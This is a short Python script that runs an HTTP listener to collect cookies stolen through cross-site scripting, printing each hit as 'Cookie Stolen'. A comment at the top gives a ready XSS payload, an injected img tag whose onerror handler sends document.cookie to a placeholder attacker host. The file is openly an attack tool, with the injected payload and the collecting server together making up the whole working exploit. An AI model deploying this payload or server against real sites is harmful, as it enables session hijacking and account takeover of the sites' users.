from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime


#Eg payload: "><img src=x onerror="this.src='http://YOUR-IP:8090/?'+document.cookie; this.removeAttribute('onerror');">
#Make a new class for the handler to the BaseHTTPRequestHandler
class XSSResponseHandler(BaseHTTPRequestHandler):

    #handle get response
    def do_GET(self):
        #self.send_response(302)
        #self.send_header("Content-type", "text/html")
        #self.end_headers()
        # query_components = parse_qs(urlparse(self.path).query)
        # for k, v in query_components.items():
        #     print ("%s\t\t\t%s" % (k.strip(), v))
       # print(self.path)
       # print(self.headers)

        print(f"Cookie Stolen: {self.path.rsplit('=',1)}")

    # def log_message(self, format, *args):
    #     return

if __name__ == "__main__":
    try:
        serv = HTTPServer(("0.0.0.0", 9898), XSSResponseHandler)
        print("Starting server on port 9898")
        serv.serve_forever()

    except KeyboardInterrupt:
        print("Shutting down...")
        serv.socket.close()
